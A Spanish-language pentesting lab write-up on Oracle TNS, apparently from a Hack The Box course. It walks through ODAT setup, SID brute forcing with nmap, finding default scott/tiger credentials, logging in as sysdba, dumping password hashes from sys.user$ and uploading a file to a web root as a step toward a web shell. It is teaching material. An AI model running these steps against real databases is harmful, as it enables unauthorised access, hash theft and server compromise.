
------------

#databases #oracle #sql #Oracle #ODAT #SQL #TNS #SID #Nmap #Metasploit #SQLplus #Hydra #SQLInjection #PrivilegeEscalation #BaseDeDatos #OracleRDBMS #SeguridadInformática #EthicalHacking #Ciberseguridad #Pentesting #Exploits #WebShell #PasswordHashing 

-----------------

#### Oracle-Tools-setup.sh

Código: bash

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

Después de eso, podemos intentar determinar si la instalación fue exitosa ejecutando el siguiente comando:

#### Prueba de ODAT

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Oracle Database Attack Tool () es una herramienta de prueba de penetración de código abierto escrita en Python y diseñada para enumerar y explotar vulnerabilidades en bases de datos de Oracle. Se puede utilizar para identificar y explotar varios fallos de seguridad en las bases de datos de Oracle, incluida la inyección SQL, la ejecución remota de código y la escalada de privilegios.`ODAT`

Usemos ahora para escanear el puerto de escucha TNS predeterminado de Oracle.`nmap`

#### Nmap

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Podemos ver que el puerto está abierto y que el servicio se está ejecutando. En Oracle RDBMS, un identificador de sistema () es un nombre único que identifica una instancia de base de datos determinada. Puede tener varias instancias, cada una con su propio ID de sistema. Una instancia es un conjunto de procesos y estructuras de memoria que interactúan para administrar los datos de la base de datos. Cuando un cliente se conecta a una base de datos de Oracle, especifica la base de datos junto con su cadena de conexión. El cliente usa este SID para identificar a qué instancia de base de datos desea conectarse. Supongamos que el cliente no especifica un SID. A continuación, se utiliza el valor predeterminado definido en el archivo.`SID``SID``tnsnames.ora`

Los SID son una parte esencial del proceso de conexión, ya que identifican la instancia específica de la base de datos a la que el cliente desea conectarse. Si el cliente especifica un SID incorrecto, se producirá un error en el intento de conexión. Los administradores de bases de datos pueden usar el SID para supervisar y administrar las instancias individuales de una base de datos. Por ejemplo, pueden iniciar, detener o reiniciar una instancia, ajustar su asignación de memoria u otros parámetros de configuración, y supervisar su rendimiento mediante herramientas como Oracle Enterprise Manager.

Hay varias formas de enumerar, o mejor dicho, adivinar los SID. Por lo tanto, podemos usar herramientas como , , , y otras. Usemos primero.`nmap``hydra``odat``nmap`

#### Nmap - Fuerza bruta SID

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

Podemos usar la herramienta para realizar una variedad de escaneos para enumerar y recopilar información sobre los servicios de base de datos de Oracle y sus componentes. Esos escaneos pueden recuperar nombres de bases de datos, versiones, procesos en ejecución, cuentas de usuario, vulnerabilidades, configuraciones incorrectas, etc. Usemos la opción y probemos todos los módulos de la herramienta.`odat.py``all``odat.py`

#### ODAT

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

En este ejemplo, encontramos credenciales válidas para el usuario y su contraseña. Después de eso, podemos usar la herramienta para conectarnos a la base de datos de Oracle e interactuar con ella.`scott``tiger``sqlplus`

#### SQLplus - Iniciar sesión

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Si se encuentra con el siguiente error, ejecute el siguiente, tomado de [aquí](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).`sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Hay muchos [comandos SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar la base de datos manualmente. Por ejemplo, podemos listar todas las tablas disponibles en la base de datos actual o mostrarnos los privilegios del usuario actual de la siguiente manera:

#### Oracle RDBMS - Interacción

  Oráculo TNS

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aquí, el usuario no tiene privilegios administrativos. Sin embargo, podemos intentar usar esta cuenta para iniciar sesión como administrador de la base de datos del sistema (), lo que nos da mayores privilegios. Esto es posible cuando el usuario dispone de los privilegios apropiados que normalmente concede el administrador de la base de datos o que utiliza el propio administrador.`scott``sysdba``scott`

#### Oracle RDBMS - Enumeración de bases de datos

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

Podemos seguir muchos enfoques una vez que obtenemos acceso a una base de datos Oracle. Depende en gran medida de la información que tengamos y de toda la configuración. Sin embargo, no podemos añadir nuevos usuarios ni realizar ninguna modificación. A partir de este punto, podríamos recuperar los hashes de la contraseña e intentar descifrarlos sin conexión. La consulta para esto sería similar a la siguiente:`sys.user$`

#### Oracle RDBMS - Extraer hashes de contraseña

  Oráculo TNS

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Otra opción es cargar un shell web en el destino. Sin embargo, esto requiere que el servidor ejecute un servidor web, y necesitamos saber la ubicación exacta del directorio raíz del servidor web. Sin embargo, si sabemos con qué tipo de sistema estamos tratando, podemos probar las rutas predeterminadas, que son:

| **Sistema operativo** | **Camino**           |
| --------------------- | -------------------- |
| Linux                 | `/var/www/html`      |
| Windows               | `C:\inetpub\wwwroot` |

En primer lugar, siempre es importante probar nuestro enfoque de explotación con archivos que no parezcan peligrosos para los sistemas antivirus o de detección/prevención de intrusiones. Por lo tanto, creamos un archivo de texto con una cadena y lo usamos para cargarlo en el sistema de destino.

#### Oracle RDBMS - Carga de archivos

  Oráculo TNS

```shell-session
zunderrubb@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
zunderrubb@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finalmente, podemos probar si el enfoque de carga de archivos funcionó con . Por lo tanto, utilizaremos una solicitud, o podemos visitar a través del navegador.`curl``GET http://<IP>`


**[[SQL]]**
[[1- Instalar Base de datos MySQL]]
[[2- Insertar Información a la Base de Datos desde Python]]
[[3- Consultas a la Base de Datos]]
[[4- Consultar a la Base de Datos + Sentencias Condicionales]]